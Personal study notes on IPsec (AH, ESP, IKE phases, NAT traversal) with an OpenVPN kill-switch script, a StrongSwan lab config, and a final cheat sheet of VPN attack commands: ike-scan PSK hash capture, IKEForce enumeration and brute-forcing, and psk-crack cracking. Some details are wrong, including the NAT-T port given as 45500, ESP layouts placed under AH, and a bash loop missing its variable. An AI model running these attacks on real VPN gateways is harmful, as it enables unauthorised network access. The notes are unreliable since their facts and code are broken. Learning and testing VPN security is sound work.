# IPsec

When two remote site what to exchange information, one safe way is virtual connect with vpn encrypted tunnel. Troubleshooot IPsec with [https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html](https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html), suggested by [Ippsec](https://www.youtube.com/watch?v=1ae64CdwLHE)

## IPsec-v3

- Authentication Header (AH) for authentication and integrity.
	- Two Modes
		1. Transport Mode: authenication for TCP/UDP header and data
			- Transport - the original IP Header is not encrypted
				- `[IP Header][Unencrypted ESP Header][TCP|UDP Header][Payload][ESP Trailer][ESP AUTH]`
				- ESP Trailer encapsulated the ESP Payload
				- ESP Auth contains a hash to authenticate everything from ESP Header to Trailer
		1. Tunnel Mode: authentication for the IP Header, TCP/UDP header and data
			- Tunnel - original IP is also encrypted
				- `[IP Header][ESP Header][IP Header][TCP|UDP Header][Payload][ESP Trailer][ESP AUTH]`
				- The first IP header is new
				- ESP Auth contains a hash to authenticate everything from ESP Header to Trailer
- Encapsulating Security Payload (ESP) for authentication, integrity, and confidentiality.
- Security Association (SA) is responsible for negotiating the encryption keys and algorithms. 
	- [Internet Key Exchange](https://en.wikipedia.org/wiki/Internet_Key_Exchange "Internet Key Exchange") (IKE) 
	- [Kerberized Internet Negotiation of Keys](https://en.wikipedia.org/wiki/Kerberized_Internet_Negotiation_of_Keys "Kerberized Internet Negotiation of Keys") (KINK)
	- And others...

Transport Mode
```goat 
Original:
| IP Header | TCP/UDP Header | Data | 


						.-----Authenticated------.
						|						|
					    v                       v
| IP Header | AH Header | TCP/UDP Header | Data | 
```

Tunnel Mode
```goat
						  .------------Authenticated-----------.
						  |								      |
					      v                                   v
New IP Header | AH Header | IP Header | TCP/UDP Header | Data | 
```

Prior to connection - Establishing of cryptographic settings - Internet Key Exchange (IKE) occurs
- Sometimes called IKE Profiles or Policy
	- Two Phases:
		1. IKE Phase One
			1. The same IKE settings go to the opposing host
			1. Establish a gateway - identify one another called Establish a Security Association
				- UDP port 500 
				- Pneumonic: 
					- H - Hash
					- A - Auth
					- G - Diffie-Hellman Group asymmetric
					- L - Lifetime
					- E - Encryption symmetric block data transfer
			1. IKE Phase Two 
				1. IPsec cryptosettings 
					- Both must match on both peers; 
					- These setting feed into a tunnel interface.
					- In between these two interfaces the symmetrically encrypted traffic can traverse.
					- IP Protocol 50

## Encapsulating Security Payload (ESP)

Encapsulating Security Payload (ESP) provides encryption
```goat 
Original:
| IP Header | TCP/UDP Header | Data | 

Transport Mode
								     .-Authenticated-&-Encrypted-.
								     |						    |
							         v                          v
| IP Header | ESP Header | AH Header | TCP/UDP Header |  Data   | ESP Trailer | ESP Authentication |


Tunnel Mode

						  .-----Authenticated-&-Encrypted------.
						  |								      |
					      v                                   v
New IP Header | AH Header | IP Header | TCP/UDP Header | Data |  ESP Trailer | ESP Authentication | 
```


## IPsec Traffic

- Hit a routing table
	- Either gateway or tunnel interface to be encrypted
		- Cleartext -> `[IP Header][TCP|UDP Header][Payload]`
		- Encrypted Modes:


## NAT Traversal

If there is NAT boudary between the two sites we must add a NAT traveral - add UDP Header behind the New IP Header - to translate between routes - for Tunnel with NAT Traversal
- UDP port 45500
`[IP Header][UDP Header][ESP HEADER][IP Header][TCP|UDP Header][Payload][ESP Trailer][ESP AUTH]`

## OpenVPN

Prevent accidental IP leaking from VPN dropping from [BHIS | OPSEC Fundamentals for Remote Red Teams - Michael Allen](https://youtu.be/AHwfV3NFlno?si=ifq3zSkE2bFvaGJA)
```bash
#!/bin/bash

# Prevent accidental IP leaking from VPN dropping
# 
# Author: BHIS - Michael Allen 
#
# Watch: https://youtu.be/AHwfV3NFlno?si=ifq3zSkE2bFvaGJA
# 
# Run with openvpn
# `openvpn --script-security 2 --down vpn-down.sh --config $VPNfile`

echo "Disabling Network Interfaces..."
systemctl stop network-manager
killall -9 dhclient
for in $(ifconfig | grep -iEo '^[a-z0-9]+:' | grep -v '^lo:$' | cut -d ':' -f 1)
do
	ifconfig $i 0.0.0.0 down
done
echo "VPN gone down completed disabling Network Interfaces"
exit
```

## Strongswan

[Strongswan](https://en.wikipedia.org/wiki/StrongSwan) is apparently really complex and requires considerations about the configuration that must be exact, unlike OpenVPN you do not need to transfer configuration file. Refer to Troubleshooting IPsec with [https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html](https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html). Ipsec manual and Ipsec.secrets, the Strongswan documentation is pretty rough and dense.

```bash
#  install strongswan
sudo apt install strongswan

# Create a transport vpn because a tunnel mode would encrypt traffic were cant exchange or debug at the other end.
# Ipsec.secrets
sudo vim /etc/ipsec.secrets
$ip %any : PSK "$Key" 

# This is not a default configuration, more anm example!
# You may need to tunnel, not transport requiring encryption configurations
# You may not need fragmentation
echo "
conn target
        type=transport
        keyexchange=ikev1
        left=$IP
        leftprotoport=tcp
        right=$target_ip
        rightprotoport=tcp
        authby=psk
        esp=3des-sha1
        fragmentation=yes 
        ike=3des-sha1-modp1024
        ikelifetime=8h
        auto=start
" | sudo tee -a /etc/ipsec.conf

sudo ipsec start --nofork
# more issues change the maximum transmission unit 
ifconfig tun0 mtu 1000 
```

Some issuse that you will face I will state here as demonstrative of the configuration difficulties post setup. [Ippsec Conceal Video discusses Ipsec](https://www.youtube.com/watch?v=1ae64CdwLHE), he also discussed using this picture to describe how with each cyclinder below is an additional amount of bytes per protocol. **IGNORE THE MESSAGE RECTANGLE**, assume the inner most Router is the message and that the maximum transmission size is 1500; the yellow being Ipsec adds another 50-5 bytes. With the referenced video, because you are using the OpenVPN to connect to HTB the blue cylinder is 60 overhead. So transport VPN inside a tunnel VPN. 
![](Onion_diagram.png)

## VPN Hacking 

Following is updated and noted mirror of VPN hacking sections of [GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)


`udp-protocol-scanner` is [GitHub CiscoCXSecurity/udp-proto-scanner](https://github.com/CiscoCXSecurity/udp-proto-scanner), so if `nmap`?
```bash
# Identify VPN servers:
./udp-protocol-scanner.pl -p ike $ip

# Scan a range for VPN servers:
./udp-protocol-scanner.pl -p ike -f ip.txt
```

Use IKEForce to enumerate or dictionary attack VPN servers - This is a `python2` script this Archived on Github see [[Python-Tooling-Libraries]]:
```bash
# Original: pip install pyip
# Requires the `pyip`, `pycrypto` and `pyopenssl` modules installed, but other than that it's only standard libs. `pyip` is the most likely lib that you won't have, install it with 'pip install pyip'
# Updated use python-venv
git clone https://github.com/SpiderLabs/ikeforce.git  

# Perform IKE VPN enumeration with IKEForce:
./ikeforce.py TARGET-IP â€“e â€“w wordlists/groupnames.dic  

# Bruteforce IKE VPN using IKEForce:
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  
```

[kali tools ike-scan](https://www.kali.org/tools/ike-scan/) for Discovery and Fingerprinting for which IKE implementation
```bash
# Use ike-scan to capture the PSK hash:
ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
ike-scan â€“M â€“A â€“n example\_group -P hash-file.txt TARGET-IP  
```

Use psk-crack to crack the PSK hash
```bash
psk-crack hash-file.txt
pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
```
## References

[THM Network Security Protocols](https://tryhackme.com/room/networksecurityprotocols)
[Wikipedia](https://en.wikipedia.org/wiki/IPsec)
[What is IPSec?](https://www.youtube.com/watch?v=tuDVWQOG0C0)
[BHIS | OPSEC Fundamentals for Remote Red Teams - Michael Allen](https://youtu.be/AHwfV3NFlno?si=ifq3zSkE2bFvaGJA)
[Ippsec Conceal Video discusses Ipsec](https://www.youtube.com/watch?v=1ae64CdwLHE)
[Wikipedia Internet Key Exchange](https://en.wikipedia.org/wiki/Internet_Key_Exchange "Internet Key Exchange")
[Wikipedia Kerberized Internet Negotiation of Keys](https://en.wikipedia.org/wiki/Kerberized_Internet_Negotiation_of_Keys "Kerberized Internet Negotiation of Keys") 
[kali tools ike-scan](https://www.kali.org/tools/ike-scan/)
[GitHub CiscoCXSecurity/udp-proto-scanner](https://github.com/CiscoCXSecurity/udp-proto-scanner)
[GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)
[Troubleshoot Ipsec https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html](https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html)